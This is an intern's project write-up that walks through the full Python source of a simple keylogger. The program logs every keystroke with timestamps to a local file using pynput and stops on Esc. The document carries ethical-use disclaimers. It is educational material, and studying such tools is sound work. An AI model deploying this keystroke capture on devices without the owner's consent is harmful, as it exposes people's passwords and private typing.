# Project 3: 
# Keylogger Implementaion

# DISCLAIMER:
  This project is created strictly for educational and ethical purposes as part of a cybersecurity internship. Do not use this tool on any system or device without explicit written permission. Unauthorized keylogging is illegal and unethical.

# Project Description

 This project demonstrates how a basic Keylogger works using Python. A keylogger captures every keystroke made by a user and logs it to a file. The project is built using the `pynput` library to monitor key events and `logging` to record the captured data.

 This tol is intended to:
  -> Show how keyloggers work for educational awareness 
  -> Demonstrate Python keyboard listener capabilities
  -> Practice ethical hacking and red team skills in a safe lab environment

# Features
 -> Logs all keyboard input (alphanumeric + special keys)
 -> Saves keystrokes with timestamps to a `.txt` lof file
 -> Automatically stops when the `Esc` key is pressed 
 -> Simple and minimal code base using `pynput` and `logging`

# Code Explanation:

 print("WARNING: This keylogger is for EDUCATIONAL use only.")
 print("Do not use it without explicit permission.")

-> Print a warining to clearly state the legal and ethical boundaries of using this project.
-> This lets users known tha its only meant for learning, and should not be used without proper authorizaion.

from pynput.keyboard import Listener, Key

 -> TThis listens for every key press and release.
 -> Key: helps to identify special keys like Esc, Shift, Enter.

import logging
-> This allows us to save each keystroke into a file. 

# Log file setup
log_file = "Key_log.txt"
 
 -> Define the file `Key_log.txt` to store all captured keystorkes.

logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s: %(message)s')

 -> Then, configure the logger to include timestamps and messages, so we know exactly when each key was pressed.

 def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

 -> This fuction runs when any key is pressed.
 -> If it's a regular key like `a` or `1` it logs the character using `key.char`

 -> If it's a special key like `shift` or `ctrl`, which don't have char, it goes to the except block and logs the full key name instead.

 def on_release(key):
    if key == Key.esc:
        print("ESC pressed. Exiting....")
        return False

 -> This function runs when any key is released, the program  stops, this gives us a clean way to exit the keylogger when we're done testing.

 with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

 -> Finally, the listener using a `with` block.
 -> It continuously runs and lisens for key press and release events.
                                                                                                              
 -> The `listener.join()` keeps it active until we press `Esc`, which triggers the stop command. 

 # What I learned:
 -> Learned how to capture keyboard events in real time using the pynput library.
 -> Applied Python’s logging module to record keystrokes with timestamps.
 -> Handled both character and special key inputs using try/except.
 -> Implemented a clean stop mechanism by detecting the Esc key.
 -> Reinforced the importance of ethical usage and permission when testing security tools.

# Author:
 Mobin Mathew
 Tamizhan Skills RISE Cybersecurity & Ethical Hacking Intern